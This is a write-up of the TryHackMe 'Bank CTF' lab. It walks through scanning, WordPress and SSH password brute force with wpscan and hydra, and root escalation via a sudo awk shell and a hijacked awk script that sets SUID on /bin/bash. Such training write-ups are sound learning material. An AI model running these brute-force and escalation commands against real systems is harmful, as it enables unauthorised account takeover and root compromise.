# Bank CTF

## Introduction

Welcome to my another writeup! In this TryHackMe [Bank CTF](https://tryhackme.com/room/bankctf) room, you'll learn: Basic enumeration, privilege escalation and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

> A beginners guide to hacking a new bank

> Difficulty: Easy

---

Roger at work mentioned a new bank opening up in one of the small towns in your area.

He said someone had reached out to him about designing their website but he declined

because the pay was going to be too little and said whoever ends up building the site

probably won’t know what they are doing.


You ask Roger for the information they gave him and decide you want to check out the site and look for some vulnerabilities...

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# export RHOSTS=10.10.53.4   
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0051327d9e134b3ccc3ef416188ff0db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSHYhKKVSQzCUwjXZ9J7zIZYqSGsAeFlctjzq3bmSnGWV1uhgSbrxp/51LoiCCiIBFtJYrH/O+efxZe/1UH/t8qsRpniccmaQQ0vp3RWOfv9zFw6H1nwDPTGqNsn/zbZo7zEj08rD/DIdNamUobOjk4vp9XqBmTyAF9YIT3Lp0lEbxAaOtoog86Tq+rifY0A73Oj8z7jfeS+xofsXCFxuD651Fyv4QL+xfg/FgFAUFhHsnXl5YgcwNT5qk8l/TUI9nEuOhzF5LexUGa3ugMuM+L6ASX7NpjLmZaDP8rf+lKQRx6LuqYSu7ZOGGbdgF0RK+aE8LkvLlp8pUQWHKPJwL
|   256 c90447eab5e1301b4b36a149e24195ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAgmnMtB3LFtq1ZpVXbHnrNhZ3bLqj8gdufjGoN6hzARxnQ9Qqx8lL2RMScbRqmmOq0keKo9J8nVin/VEEO42QM=
|   256 29e8704bea48affae721abd136483c77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYg1J2jv+eI2g3mRPbNwY+p4nZOEwLtrCI3rq7vlzDU
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.2p2 Ubuntu
80                | Apache httpd 2.4.18 ((Ubuntu))

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:** (Optional, but it's a good practice to do so.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# echo "$RHOSTS bankctf.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228225309.png)

Hmm... Seems nothing here.

**Let's view the source page:**
```html
[ !! ]City Bank Site Under Construction[ !! ]

<form action="http://*/robots.txt">
	<input type="submit" value="Check robot permission" />
</form>
```

When we click the `Check robot permission` button, **the HTML form action is go to `http://*/robots.txt`.**

**Let's check out that `robots.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# curl http://bankctf.thm/robots.txt
 791021
 729826
 711523
 57fifty
 55403818 b
 51138295
 510102121 
 4911427237 
 32500000 
 3117548331
 26867147s
 23321
 230886 
 2300
 2131KM
 1loveu
 1looove
 1ianian
 1friends1
 1dadoz
 1983
 1923 
 123mango
 121212
 110786
 10022513
 0860776252 
 0841079575
 0839236891
 081088l
 08 22 0128
 0557862091
 026429328
 0188579722
 0125457423 
 0 0 0
  yara
  tania
  sonlymylove  
  ozkelo
  nisrina  
  nan  
  love
  kaitlynn4
  hrtrbr
  g3mm@
  d1a7n6h   
LiveHackLove666
cxz
cq90000
  c125263
  besinal
  b1tch3s  
  a842000
  JOSE  
  3879
  3199737  
  25  
  11  11
   saoly   
   rocij
   qaz
   nan852
   mihardcore  
   chinesa78
   anggandako
   95   
   667306   
   6530708   
   5184558   
   333   
   3197337
   1990   
   0124309682
   0123456789
   0109381602
   000
    you805
    no
    maka
    jupanu    
    ciocolatax
    angelica
    1990
    1111
     pepe
     markinho
     mara
     54321
     123d
      7
       1234567
       1
                  
            
           
xCvBnM,
ie168
abygurl69
a6_123
Vamos!
```

It seems like it's a wordlist of passwords?

**Let's copy that for late use:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# wget http://bankctf.thm/robots.txt
```

**Then clean them via a python script:**
```py
#!/usr/bin/env python3

def main():
    with open('./robots.txt', 'r') as fd:
        for line in fd:
            # Read all lines, remove extra space, and split newline character
            listCleanData = line.strip().split('\n')

            # Clean empty line
            if '' in listCleanData:
                pass
            else:
                with open('./clean_robots.txt', 'a') as fdWrite:
                    fdWrite.write(f'{listCleanData[0]}\n')

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# python3 clean_wordlist.py

┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# head -n 10 clean_robots.txt 
791021
729826
711523
57fifty
55403818 b
51138295
510102121
4911427237
32500000
3117548331
```

**Now, let's use `gobuster` to enumerate hidden directories and files:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# gobuster dir -u http://bankctf.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x txt,bak,html
[...]
/index.html           (Status: 200) [Size: 148]
/robots.txt           (Status: 200) [Size: 1043]
/wordpress            (Status: 301) [Size: 314] [--> http://bankctf.thm/wordpress/]
```

**Nice! Found hidden directory `/wordpress`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228230821.png)

**After poking around, I found this:**

**Flag1:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229003702.png)

**Now, let's use `wpscan` to scan the WordPress CMS(Content Management System):**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# wpscan --url http://bankctf.thm/wordpress/ -e
[...]
[+] WordPress version 5.6.6 identified (Insecure, released on 2021-11-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://bankctf.thm/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.6'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://bankctf.thm/wordpress/, Match: 'WordPress 5.6.6'
[...]
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=============================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] patrick
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

**Now, we can use `searchsploit` to search Exploit-DB's public exploits for WordPress:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# searchsploit WordPress core 5.6
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

Hmm... Nothing.

However, **we also found 2 users: `patrick` and `manager`.**

**In WordPress, the default login page is in `/wp-login.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228231415.png)

**Let's try to enter an invalid username and see what will happened:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228231530.png)

`Unknown username`.

**How about a valid username?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228231600.png)

`Error: The password you entered for the username patrick is incorrect.`

That being said, **we can enumerate all valid usernames via different responses.**

> If you're interested in enumerating valid usernames via different responses, you can read my PortSwigger Lab one of my [writeup](https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-1/).

Luckly, `wpscan` already did the job for us.

**Now `wpscan` also can help us to brute force user's password:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# wpscan --url http://bankctf.thm/wordpress/ -U 'patrick,manager' -P clean_robots.txt
[...]
[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - manager / {Redacted}                                                                    
[SUCCESS] - patrick / {Redacted}                                                                              
Trying patrick / Vamos! Time: 00:00:14 <=============                   > (148 / 344) 43.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: manager, Password: {Redacted}
 | Username: patrick, Password: {Redacted}
```

We found their passwords!

**Let's login to their account, and check who has administrator permission:**

- Patrick:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234140.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234155.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234240.png)

**Biographical Info:**
```
This account doesn't seem to have very many privileges. I wonder who the admin is
```

**Flag2:**
```
THM{$2${Redacted}}
```

**Hmm... Let's log out, and login as user `manager`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234439.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234454.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221228234531.png)

Nice! This is an administrator account!

**After fumbling around, I found a hidden page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229003808.png)

**Let's view that page:**

**Flag3:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229003834.png)

**Also, we can use an [online tool](https://codebeautify.org/ascii-to-text) to convert ASCII number to text:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229004128.png)

Maybe that's the another password list?

**Let's copy and paste that to a file:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# cat << EOF > list.txt                   
heredoc> frootloop
playboy
admin
kali
oregeno 
cat
patrick
karen
remote
heredoc> EOF
```

**Now let's get a WordPress reverse shell:** (From [Hacking Articles](https://www.hackingarticles.in/wordpress-reverse-shell/))

**Inject malicious plugin:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229000533.png)

Hmm... Looks like the directory is not writeable.

**Injecting malicious code in WP_Theme:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229000629.png)

Hmm... Looks like we can't gain initial foothold via WordPress.

## Initial Foothold

**Since we found 2 users: `patrick` and `manager`, we can try to brute force SSH via `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# echo "patrick\nmanager" > usernames.txt
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# hydra -L usernames.txt -P clean_robots.txt ssh://$RHOSTS 
[...]
[22][ssh] host: 10.10.53.4   login: patrick   password: {Redacted}
```

**Found `patrick` SSH password!**

**Let's SSH into patrick:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# ssh patrick@$RHOSTS
patrick@10.10.53.4's password: 
[...]
patrick@ubuntu:~$ whoami;hostname;id;ip a
patrick
ubuntu
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `patrick`!

## Privilege Escalation

### 1. patrick to root

Let's do some enumerations!

**Sudo permission:**
```
patrick@ubuntu:~$ sudo -l
[sudo] password for patrick: 
Matching Defaults entries for patrick on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

**System users:**
```
patrick@ubuntu:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
cat:x:1001:1001:,,,:/home/cat:/bin/bash
```

```
patrick@ubuntu:~$ ls -lah /home
total 16K
drwxr-xr-x  4 root    root    4.0K Aug  4 14:16 .
drwxr-xr-x 22 root    root    4.0K Oct  8 09:25 ..
drwxr-xr-x 14 cat     cat     4.0K Oct  8 08:45 cat
drwxr-xr-x  4 patrick patrick 4.0K Dec 28 20:54 patrick
```

Found 2 system users: `cat` and `patrick`

**MySQL credentials:**
```
patrick@ubuntu:~$ cat /var/www/html/wordpress/wp-config.php
[...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'patrick' );

/** MySQL database password */
define( 'DB_PASSWORD', '{Redacted}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
[...]
```

**Armed with above information, we can directly escalate to root!**

**In the sudo permission, user `patrick` can run any commands as root:**
```
User patrick may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

**Let's Switch User to root!**
```
patrick@ubuntu:~$ sudo su root
root@ubuntu:/home/patrick# whoami;hostname;id;ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

### 2. patrick to root

**In the `patrick`'s home directory, we can find there is a hidden directory called `.bank_work`:**
```
patrick@ubuntu:~$ ls -lah
total 32K
drwxr-xr-x 4 patrick patrick 4.0K Dec 28 20:54 .
drwxr-xr-x 4 root    root    4.0K Aug  4 14:16 ..
drwxr-xr-x 3 root    root    4.0K Aug  4 10:35 .bank_work
-rw------- 1 patrick patrick  296 Dec 28 20:54 .bash_history
-rw-r--r-- 1 patrick patrick  220 Jul 14 18:20 .bash_logout
-rw-r--r-- 1 patrick patrick 3.7K Jul 14 18:20 .bashrc
drwx------ 2 patrick patrick 4.0K Jul 14 18:21 .cache
-rw-r--r-- 1 patrick patrick  655 Jul 14 18:20 .profile
-rw-r--r-- 1 patrick patrick    0 Jul 14 18:22 .sudo_as_admin_successful
```

**Let's check it out:**
```
patrick@ubuntu:~$ cd .bank_work/
patrick@ubuntu:~/.bank_work$ ls -lah
total 44K
drwxr-xr-x 3 root    root    4.0K Aug  4 10:35 .
drwxr-xr-x 4 patrick patrick 4.0K Dec 28 20:54 ..
-rw-r--r-- 1 root    root    1.5K Jun 28  2022 0312_Dealer_Schedule
-rw-r--r-- 1 root    root    1.5K Jun 28  2022 0315_Dealer_Schedule
drwxr-xr-x 3 root    root    4.0K Aug  4 09:56 bank
-rw-r--r-- 1 root    root      42 Jun 28  2022 script1.awk
-rw-r--r-- 1 root    root      44 Jun 28  2022 script2.awk
-rw-r--r-- 1 root    root    1.0K Aug  4 10:09 .script2.awk.swp
-rw-r--r-- 1 root    root      45 Jun 28  2022 script.awk
-rw-r--r-- 1 root    root    1.0K Aug  4 10:09 .script.awk.swp
-rwx------ 1 root    root     935 Aug  4 10:10 script.sh
```

**0312_Dealer_Schedule:**
```
patrick@ubuntu:~/.bank_work$ cat 0312_Dealer_Schedule 
Hour AM/PM	BlackJack_Dealer_FNAME LAST	Roulette_Dealer_FNAME LAST	Texas_Hold_EM_dealer_FNAME LAST

12:00:00 AM	Izabela Parrish	Marlene Mcpherson	Madina Britton
[...]
```

**0315_Dealer_Schedule:**
```
patrick@ubuntu:~/.bank_work$ cat 0315_Dealer_Schedule
Hour AM/PM	BlackJack_Dealer_FNAME LAST	Roulette_Dealer_FNAME LAST	Texas_Hold_EM_dealer_FNAME LAST

12:00:00 AM	Izabela Parrish	Marlene Mcpherson	Madina Britton
[...]
```

Nothing useful.

```
patrick@ubuntu:~/.bank_work$ cat script*.awk
#!/usr/bin/awk -f

awk
{print$1,$2,$5,$6}
#!/usr/bin/awk -f

awk
{print$1,$2,$7,$8}  
#!/usr/bin/awk -f 


awk
{print $1,$2,$3,$4}
```

No idea what that is.

**The `script.sh` is interesting:**
```
-rwx------ 1 root    root     935 Aug  4 10:10 script.sh
```

However, it's not world-readable, it's only readable, writable and executable by root.

**How about the `bank` directory?**
```
patrick@ubuntu:~/.bank_work$ cd bank/
patrick@ubuntu:~/.bank_work/bank$ ls -lah
total 20K
drwxr-xr-x 3 root root 4.0K Aug  4 09:56 .
drwxr-xr-x 3 root root 4.0K Aug  4 10:35 ..
-rw-r--r-- 1 root root    0 Jun 28  2022 bank_passwords
-rw-r--r-- 1 root root    0 Jun 28  2022 bank_phonenumber
-rw-r--r-- 1 root root    0 Jun 28  2022 customer_email
-rw-r--r-- 1 root root 1.4K Jun 28  2022 customer_names
-rw-r--r-- 1 root root  546 Jun 28  2022 Door_Code
drwxr-xr-x 2 root root 4.0K Aug  2 17:58 reminder
```

**customer_names:**
```
patrick@ubuntu:~/.bank_work/bank$ head -n 10 customer_names 
James
Mary
Robert
Patricia
John
Jennifer
Michael
Linda
David
Elizabeth
```

**Door_Code:**
```
patrick@ubuntu:~/.bank_work/bank$ head -n 10 Door_Code 
c
a
t
cc
ca
ct
ac
aa
at
tc
```

**Seems nothing. `reminder` directory?**
```
patrick@ubuntu:~/.bank_work/bank$ cd reminder/
patrick@ubuntu:~/.bank_work/bank/reminder$ ls -lah
total 12K
drwxr-xr-x 2 root root 4.0K Aug  2 17:58 .
drwxr-xr-x 3 root root 4.0K Aug  4 09:56 ..
-rw-r--r-- 1 root root  806 Aug  4 10:38 message_for_cat
```

```
patrick@ubuntu:~/.bank_work/bank/reminder$ cat message_for_cat 
Cat, I have temporarily changed my password to a wordcount.  
I need you to log in and find flag 6 on my account. 
Hurry up and gain access before I change my password back!

Use crunch to create a wordlist by solving these riddles:


Who can finish a book without finishing a sentence?


• Start with 6.	 
• Add the number that comes after 2.
• Subtract the number that comes before 5.	 
• Add 1.
• What number am I? 

_____________________


Use the answers to the riddle to fill in the blanks then 
run the command to generate a word list

crunch 1 <answer2> <answer1> 

the word count of this output is my temporary password. 




Love always, 
root

PS: If you haven't figured out yet, there may be another way to get into my account.. maybe one of your sudo priveleges has a vulnerability?
```

Hmm...

**After banging my head against the wall, I found the solution:**
```
patrick@ubuntu:~/.bank_work/bank/reminder$ crunch 1 6 prisoner
Crunch will now generate the following amount of data: 937923 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: {Redacted} 
^CCrunch ending at
```

**Let's login as root!**
```
patrick@ubuntu:~/.bank_work/bank/reminder$ su root
Password: 
root@ubuntu:/home/patrick/.bank_work/bank/reminder# whoami;hostname;id;ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

### 3. patrick to cat

**Since we found a user called `cat`, let's brute force that account's password via `hydra`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# hydra -l 'cat' -P list.txt ssh://$RHOSTS
[...]
[22][ssh] host: 10.10.53.4   login: cat   password: {Redacted}
```

**Found it! Let's login as `cat`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Bank-CTF]
└─# ssh cat@$RHOSTS         
cat@10.10.53.4's password: 
[...]
cat@ubuntu:~$ whoami;hostname;id;ip a
cat
ubuntu
uid=1001(cat) gid=1001(cat) groups=1001(cat)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

**Flag4:**
```
cat@ubuntu:~$ cat flag4 
THM{$4${Redacted}}
```

### 3.5. cat to root

**Let's check `sudo` permission:**
```
cat@ubuntu:~$ sudo -l
Matching Defaults entries for cat on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cat may run the following commands on ubuntu:
    (root) NOPASSWD: /home/patrick/.bank_work/script.sh
    (root) NOPASSWD: /usr/bin/awk
```

Hmm... We can run `/usr/bin/awk` and `/home/patrick/.bank_work/script.sh` as root without password!

**Accord to [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell), we can escalate to root via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229004758.png)

**Let's do that:**
```
cat@ubuntu:~$ sudo awk 'BEGIN {system("/bin/bash")}'
root@ubuntu:~# whoami;hostname;id;ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

### 3.5. cat to root

In user `cat`'s `sudo` permission, we can run `/home/patrick/.bank_work/script.sh` as root without password.

**Let's run that script:**
```
cat@ubuntu:~$ sudo /home/patrick/.bank_work/script.sh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

		***Hello, please enter the numerical hour
			for the time you want to investigate. 
		***Followed by AM or PM 
		***The Four digit date
		***And lastly the game.
	***These are the games: 
BlackJack
Roullette
TexasHoldEm



Example: 
8 AM 0310 BlackJack

 [!!]This is case sensitive.


~#8 AM 0310 BlackJack
~~~~~~~~~~~~~~~~~~~~~~~
awk: cannot open script.awk (No such file or directory)
~~~~~~~~~~~~~~~~~~~~~~~
```

**Hmm... `awk` cannot open `script.awk`?**

**What if I create a `script.awk` that will execute malicious OS command?**

**In this Stackoverflow [post](https://stackoverflow.com/questions/14634349/calling-an-executable-program-using-awk), we can execute OS command via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Bank-CTF/images/Pasted%20image%2020221229010028.png)

**Let's create a file called `script.awk`!**
```awk
cat@ubuntu:~$ nano script.awk 
BEGIN{system("chmod +s /bin/bash")}
```

**What this `awk` script do is adding SUID sticky bit to `/bin/bash`, so that we can spawn a Bash shell with root permission.**

**Let's trigger the payload!**
```
cat@ubuntu:~$ sudo /home/patrick/.bank_work/script.sh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

		***Hello, please enter the numerical hour
			for the time you want to investigate. 
		***Followed by AM or PM 
		***The Four digit date
		***And lastly the game.
	***These are the games: 
BlackJack
Roullette
TexasHoldEm



Example: 
8 AM 0310 BlackJack

 [!!]This is case sensitive.


~#8 AM 0310 BlackJack
~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~
```

**Confirm the payload worked:**
```
cat@ubuntu:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

**Nice! Let's spawn a Bash shell with SUID privilege:**
```
cat@ubuntu:~$ /bin/bash -p
bash-4.3# whoami;hostname;id;ip a
root
ubuntu
uid=1001(cat) gid=1001(cat) euid=0(root) egid=0(root) groups=0(root),1001(cat)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:72:4d:ef:1b:1f brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.4/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::72:4dff:feef:1b1f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

**Flag5:**
```
bash-4.3# cat /etc/shadow
[...]
:x:THM{$5${Redacted}}
```

## Rooted

**Flag6:**
```
Congratulations on the last flag. 
 
THM{$6$7{Redacted}} 

You've compromised the bank's operation. Happy hacking. You should get some sleep.
```

# Conclusion

What we've learned:

1. Port Scanning via `rustscan` & `nmap`
2. Information Disclosure in `robots.txt` (Web Crawler)
3. Enumerating Hidden Directories & Files via `gobuster`
4. Enumerating & Brute Forcing WordPress CMS & Login Page via `wpscan`
5. Brute Forcing SSH via `hydra`
6. Vertical & Horizontal Privilege Escalation via Misconfigurated Sudo Permissions
7. Vertical Privilege Escalation via Awk Script File Hijacking